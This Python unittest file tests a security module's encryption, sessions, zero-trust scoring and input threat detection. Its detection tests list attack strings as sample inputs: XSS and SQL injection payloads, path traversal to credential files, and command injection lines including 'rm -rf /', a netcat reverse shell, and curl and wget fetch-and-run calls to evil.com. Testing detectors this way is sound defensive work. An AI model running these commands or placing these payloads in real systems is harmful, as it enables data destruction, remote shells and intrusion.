#!/usr/bin/env python3
"""
🧪 اختبارات شاملة للنظام الكمي V3
Comprehensive tests for Quantum Security System
"""

import unittest
import json
import time
import secrets
from datetime import datetime
import sys
import os

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ministries.quantum_security_ministry import QuantumSecurityMinistry

class TestQuantumSecurityMinistry(unittest.TestCase):
    """اختبارات وزارة الأمان الكمي"""
    
    def setUp(self):
        """إعداد الاختبار"""
        self.ministry = QuantumSecurityMinistry()
    
    def test_singleton_pattern(self):
        """التأكد من أن الوزارة singleton"""
        ministry2 = QuantumSecurityMinistry()
        self.assertIs(self.ministry, ministry2)
    
    def test_system_id_generation(self):
        """اختبار توليد معرف النظام"""
        self.assertIsNotNone(self.ministry.system_id)
        self.assertTrue(self.ministry.system_id.startswith('QSM-'))
    
    def test_multi_layer_encryption(self):
        """اختبار التشفير متعدد الطبقات"""
        plaintext = "سر خطير جداً"
        context = {'user_id': 'test_user', 'purpose': 'testing'}
        
        # Encrypt
        result = self.ministry.encrypt_multi_layer(plaintext, context)
        
        self.assertTrue(result['success'])
        self.assertIn('encrypted_data', result)
        self.assertIn('encryption_log', result)
        
        # Decrypt
        decrypt_result = self.ministry.decrypt_multi_layer(result['encrypted_data'])
        
        self.assertTrue(decrypt_result['success'])
        self.assertEqual(decrypt_result['decrypted_data'], plaintext)
    
    def test_integrity_verification(self):
        """اختبار التحقق من سلامة البيانات"""
        plaintext = "test data"
        
        # Encrypt
        result = self.ministry.encrypt_multi_layer(plaintext)
        self.assertTrue(result['success'])
        
        # Tamper with data
        encrypted_data = result['encrypted_data'].copy()
        encrypted_data['ciphertext'] = 'tampered_data'
        
        # Try to decrypt tampered data
        decrypt_result = self.ministry.decrypt_multi_layer(encrypted_data)
        
        self.assertFalse(decrypt_result['success'])
        self.assertIn('Integrity check failed', decrypt_result.get('error', ''))
    
    def test_zero_trust_validation(self):
        """اختبار التحقق بنظام Zero Trust"""
        # Test with minimal context
        context = {
            'user_id': 'test_user',
            'ip_address': '192.168.1.1',
            'user_agent': 'TestAgent/1.0'
        }
        
        result = self.ministry.validate_zero_trust(context)
        
        self.assertIn('access_granted', result)
        self.assertIn('trust_score', result)
        self.assertIn('validation_results', result)
        self.assertIn('recommendations', result)
        
        # Trust score should be low without authentication
        self.assertLess(result['trust_score'], 50)
    
    def test_zero_trust_with_session(self):
        """اختبار Zero Trust مع جلسة صالحة"""
        # Create session first
        session_result = self.ministry.create_secure_session('test_user', {
            'ip_address': '192.168.1.1',
            'user_agent': 'TestAgent/1.0',
            'mfa_verified': True
        })
        
        self.assertTrue(session_result['success'])
        
        # Test with session
        context = {
            'session_token': session_result['session_token'],
            'user_id': 'test_user',
            'ip_address': '192.168.1.1',
            'user_agent': 'TestAgent/1.0',
            'mfa_verified': True
        }
        
        result = self.ministry.validate_zero_trust(context)
        
        self.assertIn('access_granted', result)
        # Should have higher trust score with valid session
        self.assertGreater(result['trust_score'], 30)
    
    def test_threat_detection_xss(self):
        """اختبار كشف XSS"""
        threats = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<iframe src="evil.com"></iframe>'
        ]
        
        for threat_input in threats:
            result = self.ministry.detect_threats(threat_input)
            
            self.assertFalse(result['safe'])
            self.assertGreater(len(result['threats']), 0)
            self.assertIn('xss', [t['type'] for t in result['threats']])
    
    def test_threat_detection_sql_injection(self):
        """اختبار كشف SQL Injection"""
        threats = [
            "' OR '1'='1",
            "admin'; DROP TABLE users--",
            "1 UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('dir')--"
        ]
        
        for threat_input in threats:
            result = self.ministry.detect_threats(threat_input)
            
            self.assertFalse(result['safe'])
            self.assertGreater(len(result['threats']), 0)
            threat_types = [t['type'] for t in result['threats']]
            self.assertTrue(any('sql' in t for t in threat_types))
    
    def test_threat_detection_path_traversal(self):
        """اختبار كشف Path Traversal"""
        threats = [
            '../../etc/passwd',
            '..\\..\\windows\\system32',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'c:\\windows\\system32\\config\\sam'
        ]
        
        for threat_input in threats:
            result = self.ministry.detect_threats(threat_input)
            
            self.assertFalse(result['safe'])
            self.assertGreater(len(result['threats']), 0)
            self.assertIn('path_traversal', [t['type'] for t in result['threats']])
    
    def test_threat_detection_command_injection(self):
        """اختبار كشف Command Injection"""
        threats = [
            '; rm -rf /',
            '| nc -e /bin/sh 10.0.0.1 4444',
            '`wget evil.com/shell.sh`',
            '$(curl evil.com | bash)'
        ]
        
        for threat_input in threats:
            result = self.ministry.detect_threats(threat_input)
            
            self.assertFalse(result['safe'])
            self.assertGreater(len(result['threats']), 0)
            self.assertIn('command_injection', [t['type'] for t in result['threats']])
    
    def test_safe_input(self):
        """اختبار المدخلات الآمنة"""
        safe_inputs = [
            'Hello World',
            'مرحبا بالعالم',
            '12345',
            'user@example.com',
            'This is a normal text without any threats'
        ]
        
        for safe_input in safe_inputs:
            result = self.ministry.detect_threats(safe_input)
            
            self.assertTrue(result['safe'])
            self.assertEqual(len(result['threats']), 0)
            self.assertEqual(result['threat_level'], 'safe')
    
    def test_session_creation(self):
        """اختبار إنشاء جلسة آمنة"""
        context = {
            'ip_address': '192.168.1.100',
            'user_agent': 'Mozilla/5.0',
            'device_fingerprint': 'abc123def456',
            'mfa_verified': True,
            'trust_score': 75
        }
        
        result = self.ministry.create_secure_session('test_user', context)
        
        self.assertTrue(result['success'])
        self.assertIn('session_token', result)
        self.assertIn('encrypted_session', result)
        self.assertEqual(result['expires_in'], 900)
    
    def test_session_validation(self):
        """اختبار التحقق من الجلسة"""
        # Create session
        session_result = self.ministry.create_secure_session('test_user', {})
        self.assertTrue(session_result['success'])
        
        token = session_result['session_token']
        
        # Validate valid session
        validation = self.ministry.validate_session(token)
        
        self.assertTrue(validation['valid'])
        self.assertEqual(validation['user_id'], 'test_user')
        
        # Test invalid token
        invalid_validation = self.ministry.validate_session('invalid_token')
        
        self.assertFalse(invalid_validation['valid'])
        self.assertEqual(invalid_validation['reason'], 'Session not found')
    
    def test_session_timeout(self):
        """اختبار انتهاء صلاحية الجلسة"""
        # Create session
        session_result = self.ministry.create_secure_session('test_user', {})
        token = session_result['session_token']
        
        # Manually expire the session
        if token in self.ministry.active_sessions:
            self.ministry.active_sessions[token]['last_activity'] = time.time() - 1000
        
        # Validate expired session
        validation = self.ministry.validate_session(token)
        
        self.assertFalse(validation['valid'])
        self.assertEqual(validation['reason'], 'Session expired')
    
    def test_max_concurrent_sessions(self):
        """اختبار الحد الأقصى للجلسات المتزامنة"""
        user_id = 'test_user'
        
        # Create max sessions
        sessions = []
        for i in range(self.ministry.max_concurrent_sessions):
            result = self.ministry.create_secure_session(user_id, {})
            self.assertTrue(result['success'])
            sessions.append(result['session_token'])
        
        # All sessions should be valid
        for token in sessions:
            validation = self.ministry.validate_session(token)
            self.assertTrue(validation['valid'])
        
        # Create one more session (should invalidate oldest)
        new_session = self.ministry.create_secure_session(user_id, {})
        self.assertTrue(new_session['success'])
        
        # First session should be invalid
        validation = self.ministry.validate_session(sessions[0])
        self.assertFalse(validation['valid'])
        
        # Last sessions should still be valid
        for token in sessions[1:]:
            validation = self.ministry.validate_session(token)
            self.assertTrue(validation['valid'])
    
    def test_emergency_protocol(self):
        """اختبار بروتوكول الطوارئ"""
        # Create some sessions
        session1 = self.ministry.create_secure_session('user1', {})
        session2 = self.ministry.create_secure_session('user2', {})
        
        # Trigger emergency protocol
        result = self.ministry.trigger_emergency_protocol('Test emergency')
        
        self.assertTrue(result['protocol_activated'])
        self.assertEqual(result['reason'], 'Test emergency')
        self.assertIn('actions_taken', result)
        
        # Check that sessions are invalidated
        self.assertEqual(len(self.ministry.active_sessions), 0)
        
        # Check that trust threshold is maxed
        self.assertEqual(self.ministry.zero_trust_config['trust_score_threshold'], 100)
    
    def test_key_rotation(self):
        """اختبار تدوير المفاتيح"""
        original_key = self.ministry.master_key
        
        # Force key rotation
        self.ministry.last_key_rotation = time.time() - (self.ministry.key_rotation_interval + 1)
        self.ministry.rotate_keys()
        
        # Key should be different
        self.assertNotEqual(original_key, self.ministry.master_key)
    
    def test_security_dashboard(self):
        """اختبار لوحة معلومات الأمان"""
        dashboard = self.ministry.get_security_dashboard()
        
        self.assertIn('system_info', dashboard)
        self.assertIn('security_metrics', dashboard)
        self.assertIn('active_sessions', dashboard)
        self.assertIn('zero_trust_config', dashboard)
        self.assertIn('threat_intelligence', dashboard)
        
        # Check system info
        self.assertEqual(dashboard['system_info']['version'], '3.0.0')
        self.assertEqual(dashboard['system_info']['system_id'], self.ministry.system_id)
    
    def test_input_sanitization(self):
        """اختبار تنظيف المدخلات"""
        dangerous_input = "<script>alert('XSS')</script>; DROP TABLE users--"
        
        result = self.ministry.detect_threats(dangerous_input)
        
        self.assertFalse(result['safe'])
        self.assertIn('input_sanitized', result)
        
        # Sanitized input should not contain dangerous characters
        sanitized = result['input_sanitized']
        dangerous_chars = ['<', '>', '"', "'", ';', '|']
        
        for char in dangerous_chars:
            self.assertNotIn(char, sanitized)
    
    def test_risk_score_calculation(self):
        """اختبار حساب درجة المخاطر"""
        # Low risk context
        low_risk_context = {
            'user_input': 'Hello World',
            'session_age': 300,  # 5 minutes
            'location_changed': False,
            'failed_attempts': 0
        }
        
        low_risk = self.ministry._calculate_risk_score(low_risk_context)
        self.assertLess(low_risk, 30)
        
        # High risk context
        high_risk_context = {
            'user_input': "'; DROP TABLE users--",
            'session_age': 7200,  # 2 hours
            'location_changed': True,
            'failed_attempts': 5
        }
        
        high_risk = self.ministry._calculate_risk_score(high_risk_context)
        self.assertGreater(high_risk, 50)
    
    def test_behavior_analysis(self):
        """اختبار تحليل السلوك"""
        user_id = 'test_user'
        
        # First behavior
        context1 = {
            'action': 'login',
            'ip_address': '192.168.1.1',
            'user_agent': 'Mozilla/5.0'
        }
        
        result1 = self.ministry._analyze_behavior(user_id, context1)
        self.assertTrue(result1)
        
        # Check that pattern is stored
        self.assertIn(user_id, self.ministry.behavior_patterns)
        self.assertEqual(len(self.ministry.behavior_patterns[user_id]), 1)
        
        # Add more behaviors
        for i in range(10):
            context = {
                'action': f'action_{i}',
                'ip_address': '192.168.1.1',
                'user_agent': 'Mozilla/5.0'
            }
            self.ministry._analyze_behavior(user_id, context)
        
        # Should have 11 patterns now
        self.assertEqual(len(self.ministry.behavior_patterns[user_id]), 11)
    
    def test_security_recommendations(self):
        """اختبار التوصيات الأمنية"""
        validation_results = {
            'authenticated': False,
            'authorized': True,
            'device_trusted': False,
            'behavior_normal': True,
            'risk_acceptable': False,
            'mfa_verified': False
        }
        
        recommendations = self.ministry._get_security_recommendations(validation_results)
        
        self.assertIsInstance(recommendations, list)
        self.assertGreater(len(recommendations), 0)
        
        # Should recommend authentication
        self.assertTrue(any('authentication' in r.lower() for r in recommendations))
        
        # Should recommend MFA
        self.assertTrue(any('multi-factor' in r.lower() for r in recommendations))
        
        # Should recommend device registration
        self.assertTrue(any('device' in r.lower() for r in recommendations))

def run_tests():
    """تشغيل جميع الاختبارات"""
    # Create test suite
    suite = unittest.TestLoader().loadTestsFromTestCase(TestQuantumSecurityMinistry)
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Print summary
    print("\n" + "="*60)
    print("📊 نتائج اختبارات النظام الكمي V3:")
    print("="*60)
    
    total_tests = result.testsRun
    failures = len(result.failures)
    errors = len(result.errors)
    success = total_tests - failures - errors
    
    print(f"✅ نجح: {success}")
    print(f"❌ فشل: {failures}")
    print(f"🚨 أخطاء: {errors}")
    
    success_rate = (success / total_tests) * 100 if total_tests > 0 else 0
    print(f"📈 نسبة النجاح: {success_rate:.1f}%")
    
    if success_rate >= 95:
        print("🎉 ممتاز! النظام يعمل بكفاءة عالية")
    elif success_rate >= 85:
        print("👍 جيد! النظام يعمل بشكل مقبول")
    elif success_rate >= 70:
        print("⚠️ مقبول، لكن يحتاج تحسينات")
    else:
        print("❌ النظام يحتاج إصلاحات عاجلة")
    
    print("="*60)
    
    return result

if __name__ == '__main__':
    run_tests()